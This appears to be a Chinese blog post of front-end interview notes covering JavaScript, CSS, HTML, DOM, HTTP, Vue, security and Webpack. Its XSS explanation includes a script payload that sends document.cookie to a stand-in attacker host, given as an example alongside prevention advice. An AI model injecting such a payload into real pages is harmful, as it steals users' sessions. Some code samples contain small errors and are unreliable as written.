title="★30s总结"></a>★30s总结</h2><ul><li>定义：声明一个匿名函数，并且马上调用这个匿名函数</li><li>作用：创建一个独立的作用域。这个作用域里面的变量，外面访问不到（即避免「变量污染」）。<blockquote><p>async/await 语法了解吗？目的是什么？</p></blockquote></li></ul><p>目的：把异步代码写成同步代码。<br>原理：<a href="https://wangsiyuan233.cn/2018/08/23/70%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–异步系列(4)</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnPromise</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</div><div class="line">        setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">            resolve(<span class="string">'happy'</span>)</div><div class="line">        &#125;,<span class="number">3000</span>)</div><div class="line">    &#125;)</div><div class="line">&#125;</div><div class="line"></div><div class="line">returnPromise().then(<span class="function">(<span class="params">result</span>)=&gt;</span>&#123;</div><div class="line">    result === <span class="string">'happy'</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> returnPromise()</div><div class="line">result === <span class="string">'happy'</span></div></pre></td></tr></table></figure></p><h2 id="★30s总结-2"><a href="#★30s总结-2" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>await 只能跟在 async后面</li><li>套娃 async/await 的目的是把异步代码写成同步代码。<blockquote><p>如何实现深拷贝？</p></blockquote></li></ul><p>【javascript】详解javaScript的深拷贝](<a href="https://www.cnblogs.com/penghuwan/p/7359026.html" target="_blank" rel="external">https://www.cnblogs.com/penghuwan/p/7359026.html</a>)</p><p>1) JSON 来深拷贝<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="meta">&#123;...&#125;</span></div><div class="line"><span class="keyword">var</span> b = <span class="type">JSON</span>.parse( <span class="type">JSON</span>.stringify(a) )</div></pre></td></tr></table></figure></p><p>缺点：JSON 不支持函数、引用、undefined、RegExp、Date……</p><p>2) 递归拷贝<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function clone(<span class="class"><span class="keyword">object</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> object2</div><div class="line">    <span class="keyword">if</span>(! (<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Object</span>) )</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="class"><span class="keyword">object</span></span></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Array</span>)</span>&#123;</div><div class="line">        object2 = []</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Function</span>)</span>&#123;</div><div class="line">        object2 = eval(<span class="class"><span class="keyword">object</span>.<span class="title">toString</span>(<span class="params"></span>))</span></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="class"><span class="keyword">object</span> <span class="title">instanceof</span> <span class="title">Object</span>)</span>&#123;</div><div class="line">        object2 = &#123;&#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//你也可以把 Array Function Object 都当做 Object 来看待，参考 https://juejin.im/post/587dab348d6d810058d87a0a</span></div><div class="line">    <span class="keyword">for</span>(let key in <span class="class"><span class="keyword">object</span>)</span>&#123;</div><div class="line">        object2[key] = clone(<span class="class"><span class="keyword">object</span>[key])</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> object2</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>如何实现数组去重？</p></blockquote><p>1) 计数排序的逻辑（只能正整数）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">var a = [4,2,5,6,3,4,5]</div><div class="line"> var <span class="built_in">hash</span>Tab = &#123;&#125;</div><div class="line"> <span class="keyword">for</span>(<span class="built_in">let</span> i=0; i&lt;a.length;i++)&#123;</div><div class="line">     <span class="keyword">if</span>(a[i] <span class="keyword">in</span> <span class="built_in">hash</span>Tab)&#123;</div><div class="line">         // 什么也不做</div><div class="line">     &#125;<span class="keyword">else</span>&#123;</div><div class="line">         <span class="built_in">hash</span>Tab[ a[i] ] = <span class="literal">true</span></div><div class="line">     &#125;</div><div class="line"> &#125;</div><div class="line"> //<span class="built_in">hash</span>Tab: &#123;4: <span class="literal">true</span>, 2: <span class="literal">true</span>, 5: <span class="literal">true</span>, 6:<span class="literal">true</span>, 3: <span class="literal">true</span>&#125;</div><div class="line"> console.log(Object.keys(<span class="built_in">hash</span>Tab)) // [<span class="string">'4'</span>,<span class="string">'2'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'3'</span>]</div></pre></td></tr></table></figure></p><p>2) Set 去重<br> <code>Array.from(new Set(a))</code></p><blockquote><p>如何用正则实现 string.trim() ？</p></blockquote><figure class="highlight qml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">string</span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">''</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>JS 原型是什么？</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/23090041" target="_blank" rel="external">什么是 JS 原型链？</a><br><a href="https://wangsiyuan233.cn/2018/02/24/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-1/" target="_blank" rel="external">深入理解JavaScript–原型系列(1)</a><br><a href="https://wangsiyuan233.cn/2018/02/26/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–原型系列(2)</a><br><a href="https://wangsiyuan233.cn/2018/02/28/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">深入理解JavaScript–原型系列(3)</a><br><a href="https://wangsiyuan233.cn/2018/03/02/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–原型系列(4)</a><br><a href="https://wangsiyuan233.cn/2018/02/19/17%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AE%9E%E4%BE%8B/" target="_blank" rel="external">原型链实例</a></p><blockquote><p>ES 6 中的 class 了解吗？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes" target="_blank" rel="external">MDN - 类</a></p><blockquote><p>JS 如何实现继承？</p></blockquote><p>1） 原型链<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="keyword">this</span>.body = <span class="string">'身体'</span></div><div class="line">  &#125;</div><div class="line">  Animal.prototype.move = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Human</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">      Animal.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>)</div><div class="line">      <span class="keyword">this</span>.name = name</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// Human.prototype.__proto__ = Animal.prototype // 非法</span></div><div class="line"></div><div class="line">  <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line">  f.prototype = Animal.prototype</div><div class="line">  Human.prototype = <span class="keyword">new</span> f()</div><div class="line"></div><div class="line">  Human.prototype.useTools = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> frank = <span class="keyword">new</span> Human()</div></pre></td></tr></table></figure></p><p>2) extends 关键字<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</div><div class="line">    constructor()&#123;</div><div class="line">        <span class="keyword">this</span>.body = '身体'</div><div class="line">    &#125;,</div><div class="line">    move()&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</div><div class="line">    constructor(name)&#123;</div><div class="line">        <span class="keyword">super</span>()</div><div class="line">        <span class="keyword">this</span>.name = name</div><div class="line">    &#125;,</div><div class="line">    useTools()&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> frank = <span class="keyword">new</span> <span class="type">Human</span>()</div></pre></td></tr></table></figure></p><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><blockquote><p>如何居中？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/03/29/33CSS%E5%B8%83%E5%B1%80%E6%96%B9%E6%A1%88%E4%B9%8Bflex-float/" target="_blank" rel="external">关于居中的一点点思考</a></p><blockquote><p>（必考） 说说盒模型。</p></blockquote><p>1）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)<br>2）有两种， IE 盒子模型、标准 W3C 盒子模型；IE的content部分包含了 border 和 padding;<br><img src="https://i.imgur.com/v7kdhsX.jpg" alt=""><br>content-box: width == 内容区宽度<br>border-box: width == 内容区宽度 + padding 宽度 + border 宽度</p><blockquote><p>css reset 和 normalize.css 有什么区别？</p></blockquote><p>1）reset 重置，之前的样式我不要，<code>a{color: red;}</code>，抛弃默认样式<br>2）normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</p><blockquote><p>选择器优先级如何确定？</p></blockquote><p><strong>CSS 选择符：</strong><br>1.id选择器(# myid)<br>2.类选择器(.myclassname)<br>3.标签选择器(div, h1, p)<br>4.相邻选择器(h1 + p)<br>5.子选择器(ul &gt; li)<br>6.后代选择器(li a)<br>7.通配符选择器( * )<br>8.属性选择器(a[rel = “external”])<br>9.伪类选择器(a: hover, li:nth-child)</p><p><strong>优先级算法：</strong><br>1.优先级就近原则，同权重情况下样式定义最近者为准;<br>2.载入样式以最后载入的定位为准;<br>3.!important &gt;  id &gt; class &gt; tag<br>4.important 比 内联优先级高，但内联比 id 要高</p><blockquote><p>BFC 是什么？</p></blockquote><p>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）<br>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" target="_blank" rel="external">（代码演示）</a>（方方用 padding-top: 1px;）</p><blockquote><p>如何清除浮动？</p></blockquote><p><a href="https://www.iyunlu.com/view/css-xhtml/55.html" target="_blank" rel="external">那些年我们一起清除过的浮动</a></p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote><p>（必考） 你是如何理解 HTML 语义化的？</p></blockquote><p>1） 去掉或者丢失样式的时候能够让页面呈现出清晰的结构<br>2） 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；<br>3） 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；<br>4） 便于团队开发和维护，语义化使得网页更具可读性，是进一步开发网页的必要步骤，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</p><blockquote><p>meta viewport 是做什么用的，怎么写？</p></blockquote><p> <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</code><br> 控制页面在移动端不要缩小显示。<br> 一开始，所有页面都是给PC准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。<br> 后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</p><blockquote><p>canvas 元素是干什么的？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API" target="_blank" rel="external">canvas 入门手册</a></p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><blockquote><p>DOM 事件模型是什么？</p></blockquote><p>1)冒泡<br>2)捕获<br>3)如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，<a href="http://jsbin.com/raqakog/1/edit?js,console,output" target="_blank" rel="external">顺序是由监听顺序决定的。</a></p><blockquote><p>移动端的触摸事件了解吗？</p></blockquote><p>1）touchstart touchmove touchend touchcancel<br>2）模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。</p><blockquote><p>事件委托是什么？有什么好处？</p></blockquote><p>1）假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。<br>2）可以监听还没有出生的儿子（动态生成的元素）。省监听器。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span>&#123;</span></div><div class="line"> element.addEventListener(eventType, <span class="keyword">e</span>=&gt;&#123;</div><div class="line">     <span class="keyword">if</span>(<span class="keyword">e</span>.target.matches(selector))&#123;</div><div class="line">         fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</div><div class="line">     &#125;</div><div class="line"> &#125;)</div><div class="line">&#125;// 有 bug 但是可以应付面试官的事件委托</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span> &#123;</span></div><div class="line"> element.addEventListener(eventType, <span class="keyword">e</span> =&gt; &#123;</div><div class="line">     <span class="keyword">let</span> <span class="keyword">el</span> = <span class="keyword">e</span>.target</div><div class="line">     <span class="keyword">while</span> (!el.matches(selector)) &#123;</div><div class="line">         <span class="keyword">if</span> (element === <span class="keyword">el</span>) &#123;</div><div class="line">             <span class="keyword">el</span> = null</div><div class="line">             <span class="keyword">break</span></div><div class="line">         &#125;</div><div class="line">         <span class="keyword">el</span> = <span class="keyword">el</span>.parentNode</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">el</span> &amp;&amp; fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</div><div class="line"> &#125;)</div><div class="line"> <span class="keyword">return</span> element</div><div class="line">&#125; // 工资 <span class="number">12</span><span class="keyword">k</span>+ 的前端写的事件委托</div><div class="line">listen(ul, <span class="string">'click'</span>, <span class="string">'li'</span>, ()=&gt;&#123;&#125;)</div><div class="line"></div><div class="line">ul&gt;li*<span class="number">5</span>&gt;span</div></pre></td></tr></table></figure></p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><blockquote><p>HTTP 状态码知道哪些？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/04/03/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>301 和 302 的区别是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/04/03/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>HTTP 缓存怎么做？</p></blockquote><p><a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="external">HTTP缓存控制小结</a><br>1）<code>Cache-Control: max-age=300</code><br>2）避开缓存</p><blockquote><p>Cookie 是什么？Session 是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/02/20/18Cookie/" target="_blank" rel="external">小饼干</a><br><a href="https://wangsiyuan233.cn/2018/02/21/19%E7%BC%93%E5%AD%98/" target="_blank" rel="external">缓存</a></p><blockquote><p>LocalStorage 和 Cookie 的区别是什么？</p></blockquote><p><a href="https://wangsiyuan233.cn/2018/02/21/19%E7%BC%93%E5%AD%98/" target="_blank" rel="external">缓存</a></p><blockquote><p>（必考）GET 和 POST 的区别是什么？</p></blockquote><p>1）参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。<br>2）安全（扯淡）。GET 没有 POST 安全（都不安全）<br>3）GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）<br>4）包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）<br>5）GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）</p><p><a href="https://wangsiyuan233.cn/2018/04/03/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？</p></blockquote><p><a href="https://segmentfault.com/a/1190000009624849" target="_blank" rel="external">同源策略与JS跨域（JSONP , CORS）</a><br><a href="https://www.jianshu.com/p/96a94b92e94e" target="_blank" rel="external">JSONP、CROS和postMessage跨域</a></p><h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><blockquote><p>（必考）Vue 有哪些生命周期钩子函数？</p></blockquote><p><a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" target="_blank" rel="external">官方文档</a></p><blockquote><p>（必考）Vue 如何实现组件通信？</p></blockquote><p>1）父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）<br>2）爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）<br>3）<a href="https://cn.vuejs.org/v2/guide/state-management.html" target="_blank" rel="external">兄弟通信（new Vue() 作为 eventBus）</a></p><blockquote><p>Vuex 的作用是什么？</p></blockquote><p><a href="https://vuex.vuejs.org/zh/guide/" target="_blank" rel="external">官方文档</a></p><blockquote><p>VueRouter 路由是什么？</p></blockquote><p><a href="https://router.vuejs.org/zh/guide/#html" target="_blank" rel="external">官方文档</a><br><a href="http://www.cnblogs.com/keepfool/p/5690366.html" target="_blank" rel="external">Vue.js——vue-router 60分钟快速入门</a></p><blockquote><p>Vue 的双向绑定是如何实现的？有什么缺点？</p></blockquote><p><a href="https://cn.vuejs.org/v2/guide/reactivity.html" target="_blank" rel="external">深入响应式原理</a></p><blockquote><p>Computed 计算属性的用法？跟 Methods 的区别。</p></blockquote><p>1）computed是响应式的，methods并非响应式。<br>2）调用方式不一样，computed定义的成员像属性一样访问，methods定义的成员必须以函数形式调用。<br>3）computed是带缓存的，只有其引用的响应式属性发生改变时才会重新计算，而methods里的函数在每次调用时都要执行。<br>4）computed中的成员可以只定义一个函数作为只读属性，也可以定义get/set变成可读写属性，这点是methods中的成员做不到的</p><p>在我们的实际开发中，有时很难去确定具体用computed还是methods，因为这两种方法最后的到的结果是一样的，但是他们的原理和用法却完全不同，比如：我们想去时刻监控数据的变化，在视图上显示不同的结果，当然这两中方法都可以实现这种效果，这个时候用computed就比较合理了，因为computed是可缓存的，只要数据层值不改变，computed就不会去改变，而且可缓存，如果数据层的值变了，computed就会实时更新到视图层上，所以说computed是响应式的。</p><p>还有一个不同点就是在于computed是以对象的属性方式存在的，在视图层直接调用就可以得到值，而methods必须以函数形式调用，可见，computed直接以对象属性方式调用，而methods必须要函数执行才可以得到结果。</p><h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><blockquote><p>什么是 XSS 攻击？如何预防？</p></blockquote><p>1）举例<br><code>div.innerHTML = userComment</code><br>// userComment<br>内容是 <code>&lt;script&gt;$.get(&#39;http://hacker.com?cookie=&#39;+document.cookie)&lt;/script&gt;</code><br>// 恶意就被执行了，这就是 XSS<br>2)<br>2.1不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行<br>2.2如果你一样要用 innerHTML，字符过滤<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ‘ 替换成 &#39;<br>把 ‘ 替换成 &quot;<br>代码 <code>div.innerHTML = userComment.replace(/&gt;/g, &#39;&amp;lt;&#39;).replace...</code><br>2.3使用 CSP Content Security Policy</p><blockquote><p>什么是 CSRF 攻击？如何预防？</p></blockquote><p>1)过程<br>用户在 qq.com 登录<br>用户切换到 <code>hacker.com</code>（恶意网站）<br>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。<br>用户在不知不觉中添加 hacker 为好友。<br>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。<br>2）避免<br>检查 referer，qq.com 可以拒绝来自<code>hacker.com</code> 的请求<br><code>csrf_token</code> 来解决</p><h1 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h1><blockquote><p>转译出的文件过大怎么办？</p></blockquote><p>1）使用 code split<br>2）写法<code>import(&#39;xxx&#39;).then(xxx=&gt;{console.log(xxx)})</code><br>3）xxx 模块就是按需加载的</p><blockquote><p>转译速度慢什么办？</p></blockquote><p>对不起我不会好吗，什么问题</p><blockquote><p>写过 webpack loader 吗？</p></blockquote><p>如何开发一个<a href="http://www.alloyteam.com/2016/01/webpack-loader-1/" target="_blank" rel="external"> webpack loader</a></p><h1 id="发散题"><a href="#发散题" class="headerlink" title="发散题"></a>发散题</h1><blockquote><p>从输入 URL 到页面展现中间发生了什么？</p></blockquote><p>1）DNS 查询 DNS 缓存<br>2）建立 TCP 连接（三次握手）连接复用<br>3）发送 HTTP 请求（请求的四部分）<br>4）后台处理请求<br>  监听 80 端口<br>  路由<br>  渲染 HTML 模板<br>  生成响应<br>5）发送 HTTP 响应<br>6）关闭 TCP 连接（四次挥手）<br>7）解析 HTML<br>8）下载 CSS（缓存<br>9）解析 CSS<br>10）下载 JS（缓存<br>11）解析 JS<br>12）下载图片<br>13）解析图片<br>14）渲染 DOM 树<br>15）渲染样式树<br>16）执行 JS</p><blockquote><p>你没有工作经历吗？</p></blockquote><p>一开始就问，可以拜拜。<br>中间问最后问，他想压价。<br>解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。</p><h1 id="刁钻代码"><a href="#刁钻代码" class="headerlink" title="刁钻代码"></a>刁钻代码</h1><p><a href="http://wangsiyuan233.cn/2018/06/20/55JavaScript-Puzzlers/" target="_blank" rel="external">JavaScript Puzzlers!</a></p><h1 id="前端算法"><a href="#前端算法" class="headerlink" title="前端算法"></a>前端算法</h1><p>1）<a href="http://wangsiyuan233.cn/2018/07/19/62%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/" target="_blank" rel="external">排序算法</a>（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）<br>2）<a href="https://wangsiyuan233.cn/2018/07/24/63%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/#more" target="_blank" rel="external">二分查找法</a><br>3）<a href="https://wangsiyuan233.cn/2018/07/25/64%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/" target="_blank" rel="external">二叉树</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;JavaScript&quot;&gt;&lt;a href=&quot;#JavaScript&quot; class=&quot;headerlink&quot; title=&quot;JavaScript&quot;&gt;&lt;/a&gt;JavaScript&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JS 有哪些数据类型？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;七个小矮子：&lt;code&gt;string&lt;/code&gt; &lt;code&gt;number&lt;/code&gt; &lt;code&gt;bool&lt;/code&gt; &lt;code&gt;undefined&lt;/code&gt; &lt;code&gt;null&lt;/code&gt; &lt;code&gt;object&lt;/code&gt; &lt;code&gt;symbol&lt;/code&gt;&lt;br&gt;&lt;code&gt;object&lt;/code&gt; 包括了数组、函数、正则、日期等对象&lt;br&gt;一旦出现（数组、函数、正则、日期、NaN）直接0分&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（必考） Promise 怎么使用？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://wangsiyuan233.cn/2018/04/02/36%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-2/&quot;&gt;深入理解JavaScript–异步系列(2)&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
